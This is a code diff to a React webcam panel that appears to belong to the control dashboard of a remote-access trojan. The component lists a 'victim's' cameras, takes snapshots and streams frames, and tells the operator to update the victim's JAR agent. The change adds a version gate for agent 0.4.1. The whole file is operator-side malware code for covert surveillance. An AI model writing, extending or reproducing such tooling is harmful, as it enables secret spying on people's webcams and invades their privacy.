@@ -6,6 +6,7 @@ import type { Task, Victim } from '@/lib/types';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
 import { humanError } from '@/lib/errors';
+import { versionAtLeast } from '@/lib/actions';
 
 type StreamResult = { frames?: string[]; fps?: number; count?: number; data?: string; bytes?: number; device?: string };
 
@@ -17,6 +18,7 @@ export function WebcamPanel({ victim }: { victim: Victim }) {
   const [index, setIndex] = useState(0);
   const [busy, setBusy] = useState('');
   const timer = useRef<ReturnType<typeof setInterval> | null>(null);
+  const supported = versionAtLeast(victim.agentVersion, '0.4.1');
   const { data, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&limit=30`, { pollMs: 2_000 });
 
   const tasks = data?.items ?? [];
@@ -58,9 +60,9 @@ export function WebcamPanel({ victim }: { victim: Victim }) {
         <p className="text-2xs uppercase tracking-wide text-muted">Webcam</p>
         {running ? <Badge tone="warn">{running.status}</Badge> : null}
         <div className="ml-auto flex gap-1">
-          <Button size="icon" variant="ghost" title="Detectar cámaras" aria-label="Detectar cámaras" loading={busy === 'webcam:devices'} disabled={!victim.socket} onClick={() => void enqueue('webcam:devices', {})}><RefreshCw className="h-3 w-3" /></Button>
-          <Button size="sm" variant="secondary" disabled={!victim.socket || Boolean(running)} loading={busy === 'webcam:snapshot'} onClick={() => { setPlaying(false); void enqueue('webcam:snapshot', { device, quality }); }}><Camera className="h-3 w-3" /> foto</Button>
-          {playing ? <Button size="sm" variant="destructive" onClick={() => setPlaying(false)}><CircleStop className="h-3 w-3" /> parar</Button> : <Button size="sm" disabled={!victim.socket || Boolean(running)} loading={busy === 'webcam:stream'} onClick={() => { setIndex(0); void enqueue('webcam:stream', { device, quality: Math.min(quality, 60), fps, max_frames: Math.min(90, fps * 6) }); setPlaying(true); }}>stream {fps} fps</Button>}
+          <Button size="icon" variant="ghost" title="Detectar cámaras" aria-label="Detectar cámaras" loading={busy === 'webcam:devices'} disabled={!victim.socket || !supported} onClick={() => void enqueue('webcam:devices', {})}><RefreshCw className="h-3 w-3" /></Button>
+          <Button size="sm" variant="secondary" disabled={!victim.socket || !supported || Boolean(running)} loading={busy === 'webcam:snapshot'} onClick={() => { setPlaying(false); void enqueue('webcam:snapshot', { device, quality }); }}><Camera className="h-3 w-3" /> foto</Button>
+          {playing ? <Button size="sm" variant="destructive" onClick={() => setPlaying(false)}><CircleStop className="h-3 w-3" /> parar</Button> : <Button size="sm" disabled={!victim.socket || !supported || Boolean(running)} loading={busy === 'webcam:stream'} onClick={() => { setIndex(0); void enqueue('webcam:stream', { device, quality: Math.min(quality, 60), fps, max_frames: Math.min(90, fps * 6) }); setPlaying(true); }}>stream {fps} fps</Button>}
         </div>
       </div>
 
@@ -83,6 +85,7 @@ export function WebcamPanel({ victim }: { victim: Victim }) {
 
       {error ? <p className="mt-1 rounded border border-bad/30 bg-bad/10 px-2 py-1 text-2xs text-bad" data-webcam-error>{error}</p> : null}
       {!victim.socket ? <p className="mt-1 text-2xs text-warn">Sin socket: no se puede abrir la cámara.</p> : null}
+      {!supported ? <p className="mt-1 text-2xs text-warn">Requiere agente 0.4.1; actualiza el JAR de la víctima.</p> : null}
 
       {playing && frames.length > 0 ? (
         <img src={`data:image/jpeg;base64,${frames[index % frames.length]}`} alt={`webcam frame ${index + 1}`} className="mt-1.5 w-full rounded border border-line object-contain" data-webcam-stream />
